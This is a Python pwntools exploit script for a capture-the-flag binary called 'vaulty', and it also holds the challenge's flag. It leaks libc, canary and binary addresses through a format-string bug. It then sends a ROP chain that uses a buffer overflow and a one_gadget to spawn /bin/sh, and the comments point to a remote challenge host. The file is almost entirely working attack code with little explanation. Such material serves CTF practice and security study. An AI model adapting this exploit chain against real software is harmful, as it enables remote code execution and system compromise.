#!/usr/bin/env python3

from pwn import *

elf = ELF("./vaulty", False)
libc = ELF("./libc.so.6", False)

# sess = remote("vaulty.insomnihack.ch", 4556)
sess = process(["./ld-linux.so.2", elf.path], env={"LD_PRELOAD":"./libc.so.6"})
# sess = process(elf.path)


class Pwner:
	def __init__(self, session):
		self.s = session


	def leakAddresses(self):
		# %3$p 	->	libc:	libc.address + 0x114697
		# %11$p ->	canary
		# %13$p ->	return: ELF_BASE + 0x1984

		self.createEntry( username=b"%3$p.%11$p.%13$p" )
		self.printEntry( 0 )
		
		# Username: 0x7fe05d200000.0x319aedbb24a52000.0x7fe05d627000\n
		self.s.recvuntil(b'Username: ')
		leaks = [int(addr, 16) for addr in self.s.recvline(False).decode().split(".")]
		
		libc.address = leaks[0] - 0x114697
		self.canary = leaks[1]
		elf.address = leaks[2] - 0x1984

		self.s.success(f"Libc's base is {hex(libc.address)}")
		self.s.success(f"Elf's base is {hex(elf.address)}")
		self.s.success(f"Canary is {hex(self.canary)}")


	def ropAttack(self):
		# 0xebc88 execve("/bin/sh", rsi, rdx)
		# constraints:
		#   address rbp-0x78 is writable
		#   [rsi] == NULL || rsi == NULL || rsi is a valid argv
		#   [rdx] == NULL || rdx == NULL || rdx is a valid envp

		ONE_GADGET = 	libc.address + 0xebc88
		gRET = 			libc.address + 0x0000000000029139
		gPOP_RDX_RET = 	libc.address + 0x00000000000796a2
		gPOP_RSI_RET = 	libc.address + 0x000000000002be51

		payload = flat(
			b"a" * (32 + 8),			# offset
			p64( self.canary ),			# canary
			b"a" * 16,					# offset
			p64( elf.bss(0x100) ),		# rbp
			p64( gRET ) * 3,			# just in case
			p64( gPOP_RDX_RET ),		# set rdx 0
			p64( 0x0 ),
			p64( gPOP_RSI_RET ),		# set rsi 0
			p64( 0x0 ),
			p64( ONE_GADGET ),			# execve("/bin/sh", rsi, rdx)
		)

		self.createEntry( url=payload )


	def createEntry(self, username=b'test', password=b'test', url=b'test'):
		self.s.recvuntil(b'Vault Menu:')
		self.s.sendline(b'1')
		for data in [username, password, url]:
			self.s.sendline(data)


	def modifyEntry(self, username=b'test', password=b'test', url=b'test'):
		self.s.recvuntil(b'Vault Menu:')
		self.s.sendline(b'2')
		for data in [username, password, url]:
			self.s.sendline(data)


	def printEntry(self, id):
		self.s.recvuntil(b'Vault Menu:')
		self.s.sendline(b'4')
		self.s.sendline( str(id).encode() )


def main():

	pwner = Pwner(sess)

	pwner.s.info(f"Leaking addresses via the format-string vuln.....")
	pwner.leakAddresses()

	pwner.s.info(f"Getting the RCE via the ROP with the BoF.....")
	pwner.ropAttack()

	# gdb.attach(s)
	pwner.s.interactive()


# INS{An0Th3r_P4SSw0RD_m4nag3r_h4ck3d}

if __name__=="__main__":
	main()